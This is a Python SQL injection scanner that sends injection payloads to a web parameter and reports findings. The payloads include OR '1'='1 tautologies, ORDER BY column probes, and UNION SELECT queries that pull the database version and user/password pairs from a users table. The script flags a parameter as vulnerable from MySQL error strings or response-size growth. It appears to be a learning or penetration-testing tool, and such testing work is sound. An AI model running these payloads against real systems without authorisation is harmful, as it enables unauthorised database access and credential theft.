import requests
import colorama
from colorama import Fore, Style

colorama.init()

PAYLOADS = [
    " 'OR '1'='1",
    " 'OR '1'='1'--",
    "' UNION SELECT null, version()-- -",
    "' UNION SELECT user, password FROM users-- -",
    "1' ORDER BY 1-- -",
    "1' ORDER BY 2-- -",
    "1' ORDER BY 3-- -",
]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax",
    "mariadb",
]

def test_sqli(url: str, param: str, session=None) -> list:
    findings = []
    requester = session or requests

    print(f"\n[*] Testing {url} for SQL Injection on param: {param}")
    
    #Get baseline response size
    baseline = requester.get(url, params={param: "1", "Submit":"Submit"})
    baseline_size = len(baseline.text)
    print(f"[*] Baseline response size: {baseline_size} bytes")

    for payload in PAYLOADS:
        try:
            response = requester.get(url, params={param: payload, "Submit":"Submit"})
            body = response.text.lower()
            response_size = len(response.text)
            size_diff = response_size - baseline_size

            for sig in ERROR_SIGNATURES:
                if sig in body:
                    findings.append({
                        "type": "SQL Injection",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "evidence": sig,
                    })
                    print(f"{Fore.RED}[VULNERABLE]{Style.RESET_ALL} Payload: {payload}")
                    print(f" Evidence: {sig}")
                    break
            else:
                if size_diff > 200:
                    findings.append({
                        "type": "SQL Injection (possible)",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "evidence": f"response grew by {size_diff} bytes",
                    })
                    print(f"{Fore.RED}[VULNERABLE]{Style.RESET_ALL} Payload: {payload}")
                    print(f"  Evidence: response grew size by {size_diff} bytes")
                else: 
                    print(f"{Fore.GREEN}[SAFE]{Style.RESET_ALL} Payload: {payload} (size diff: {size_diff} bytes)")

        except requests.exceptions.RequestException as e:
            print(f"{Fore.YELLOW}[ERROR]{Style.RESET_ALL} {e}")

    return findings
